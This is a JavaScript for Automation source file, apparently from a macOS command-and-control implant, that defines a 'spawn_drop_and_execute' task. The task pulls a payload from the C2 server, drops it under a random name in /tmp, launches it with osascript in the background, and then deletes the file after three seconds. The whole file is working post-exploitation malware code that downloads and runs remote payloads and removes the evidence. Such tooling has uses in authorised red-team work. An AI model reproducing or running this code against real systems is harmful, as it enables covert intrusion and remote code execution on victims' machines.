exports.spawn_drop_and_execute = function(task, command, params){
    let artifacts = [];
    try{
        let config = JSON.parse(params);
        //full_url = C2.baseurl + "api/v1.0/payloads/get/" + split_params[3];
        let m = [...Array(Number(10))].map(i=>(~~(Math.random()*36)).toString(36)).join('');
        let temp_file = "/tmp/" + m;
        let file = C2.upload(task, config['template'], temp_file);

        let path = "/usr/bin/osascript";
        let result = write_data_to_file(file, temp_file);
        if(result !== "file written"){return {"user_output": result, "completed": true, "status": 'error'};}
        else{artifacts.push({"base_artifact": "File Create", "artifact": temp_file});}
        let args = ['-l','JavaScript', temp_file, '&'];
        try{
            let pipe = $.NSPipe.pipe;
            let file = pipe.fileHandleForReading;  // NSFileHandle
            let task = $.NSTask.alloc.init;
            task.launchPath = path;
            task.arguments = args;
            task.standardOutput = pipe;
            task.standardError = pipe;
            task.launch;
            artifacts.push({"base_artifact": "Process Create", "artifact": "/usr/bin/osascript " + args.join(" ")});
        }
        catch(error){
            return {"user_output":error.toString(), "completed": true, "status": "error", "artifacts": artifacts};
        }
        //give the system time to actually execute the file before we delete it
        $.NSThread.sleepForTimeInterval(3);
        let fileManager = $.NSFileManager.defaultManager;
        fileManager.removeItemAtPathError($(temp_file), $());
        return {"user_output": "Created temp file: " + temp_file + ", started process and removed file", "completed": true, "artifacts": artifacts};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error", "artifacts": artifacts};
    }
};

    